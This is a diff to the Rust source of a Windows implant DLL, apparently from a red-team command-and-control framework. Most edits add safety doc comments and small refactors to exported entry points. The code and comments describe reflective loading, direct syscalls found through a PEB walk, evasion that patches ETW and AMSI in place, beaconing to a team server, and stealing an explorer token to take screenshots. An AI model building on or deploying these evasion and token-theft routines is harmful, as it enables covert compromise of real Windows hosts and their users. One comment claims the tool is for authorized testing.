@@ -79,7 +79,7 @@ fn bootstrap_skip_sandbox() -> bool {
                 let f: FnGetEnv = core::mem::transmute(addr);
                 let mut buf = [0u8; 2];
                 let n = f(
-                    b"NYX_SKIP_SANDBOX\0".as_ptr(),
+                    c"NYX_SKIP_SANDBOX".as_ptr().cast::<u8>(),
                     buf.as_mut_ptr(),
                     buf.len() as u32,
                 );
@@ -254,6 +254,11 @@ unsafe fn bootstrap_runtime_finalize() {
 ///
 /// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
 /// extraction marks as the entry point.
+///
+/// # Safety
+/// Exported entry point invoked by the reflective loader (not from Rust). Takes
+/// no arguments and never returns; the caller must have loaded the DLL into a
+/// live process with a valid PEB so ntdll can be located.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_entry() {
     let Some(_ntdll) = bootstrap() else {
@@ -268,6 +273,11 @@ pub unsafe extern "system" fn nyx_entry() {
 /// CSPRNG register + syscalls only — NO hookchain/blind/pdata). Tests whether
 /// the evasion init in bootstrap() is causing the 0xC0000409 abort.
 /// Exit codes: same as beacon_oneshot (0xC1 = check-in failed, etc).
+///
+/// # Safety
+/// Exported test entry point (e.g. via `rundll32`). Takes no arguments and
+/// never returns; same loader-provided process-environment requirements as
+/// [`nyx_entry`].
 #[no_mangle]
 pub unsafe extern "system" fn nyx_beacon_noevasion() {
     // Minimal init: ntdll + CSPRNG + syscalls only.
@@ -281,6 +291,11 @@ pub unsafe extern "system" fn nyx_beacon_noevasion() {
 /// `nyx_beacon_noevasion` but runs the continuous `beacon_loop()` instead of
 /// a single oneshot. For authorized testing where the evasion init (hookchain/
 /// blind/pdata) causes issues on the specific host.
+///
+/// # Safety
+/// Exported test entry point (e.g. via `rundll32`). Takes no arguments and
+/// never returns; same loader-provided process-environment requirements as
+/// [`nyx_entry`].
 #[no_mangle]
 pub unsafe extern "system" fn nyx_entry_noevasion() {
     diag_mark(b"N0_entry");
@@ -329,6 +344,11 @@ unsafe fn exit_in_entry(code: u32) -> ! {
 /// configured server and exits with a status. Invoke via
 /// `rundll32 nyx_implant_win.dll,nyx_beacon_oneshot` while the team server is
 /// running. See `beacon::beacon_oneshot` for exit-code meanings.
+///
+/// # Safety
+/// Exported integration-test entry point (via `rundll32`). Takes no arguments
+/// and never returns on success; same loader-provided process-environment
+/// requirements as [`nyx_entry`].
 #[no_mangle]
 pub unsafe extern "system" fn nyx_beacon_oneshot() {
     let Some(_ntdll) = bootstrap() else {
@@ -346,6 +366,11 @@ pub unsafe extern "system" fn nyx_beacon_oneshot() {
 /// this process to finish, then reads the BMP back. No beacon loop, no
 /// check-in — pure file handoff. Invoke as
 /// `rundll32 nyx_implant_win.dll,nyx_screenshot_session`.
+///
+/// # Safety
+/// Exported helper entry point invoked via `rundll32` inside an interactive
+/// session. Takes no arguments and never returns; writes only to the fixed
+/// capture path documented above.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_screenshot_session() {
     // Capture target: a non-descript temp file name. The fixed `nyx_shot.bmp`
@@ -374,9 +399,14 @@ pub unsafe extern "system" fn nyx_screenshot_session() {
 ///   - if an `Err` item is present, line 2 is the error string (this carries the
 ///     `XSESS_FAIL` step code, e.g. "...failed (step 3: explorer token theft
 ///     failed...)"). If a `FileChunk` is present, line 2 is "OK <total bytes>".
+///
 /// Exits 0 on a successful capture, 1 otherwise. Invoke as
 /// `rundll32 nyx_implant_win.dll,nyx_screenshot_test`. NOT shipped in production
 /// builds — temporary instrumentation.
+///
+/// # Safety
+/// Exported test entry point (via `rundll32`). Takes no arguments and never
+/// returns; writes only the fixed diagnostic file documented above.
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_screenshot_test() {
@@ -389,10 +419,8 @@ pub unsafe extern "system" fn nyx_screenshot_test() {
             crate::screenshot::Response::FileChunk { data, .. } => {
                 total_bytes = total_bytes.saturating_add(data.len());
             }
-            crate::screenshot::Response::Err(s) => {
-                if err_str.is_none() {
-                    err_str = Some(s.as_str());
-                }
+            crate::screenshot::Response::Err(s) if err_str.is_none() => {
+                err_str = Some(s.as_str());
             }
             _ => {}
         }
@@ -424,15 +452,6 @@ pub unsafe extern "system" fn nyx_screenshot_test() {
     exit_in_entry(if ok { 0 } else { 1 });
 }
 
-/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
-/// table, and exits the process with a code reporting the result:
-///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
-///   - exit code = 0xFFFFFFFF = ntdll could not be located
-///
-/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
-/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
-/// table → SSN resolution) on a real Windows host without any network activity
-/// or persistence — a benign closed-loop check.
 /// Exit with `code` via the resolved ExitProcess; traps if unavailable.
 #[cfg(feature = "selftest")]
 unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
@@ -445,6 +464,19 @@ unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
     }
 }
 
+/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
+/// table, and exits the process with a code reporting the result:
+///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
+///   - exit code = 0xFFFFFFFF = ntdll could not be located
+///
+/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
+/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
+/// table → SSN resolution) on a real Windows host without any network activity
+/// or persistence — a benign closed-loop check.
+///
+/// # Safety
+/// Exported self-test entry point (via `rundll32`). Takes no arguments and
+/// never returns; reads only the calling process's own PEB/ntdll.
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest() {
@@ -548,6 +580,10 @@ pub unsafe extern "system" fn nyx_selftest() {
 /// through to Phase 5's code. To read each independently, run with the host in
 /// different states (e.g. under an EDR for D>0). Invoke via
 /// `rundll32 nyx_implant_win.dll,nyx_selftest_evasion`.
+///
+/// # Safety
+/// Exported self-test entry point (via `rundll32`). Takes no arguments and
+/// never returns; patches the calling process's own ETW/AMSI in place.
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_evasion() {
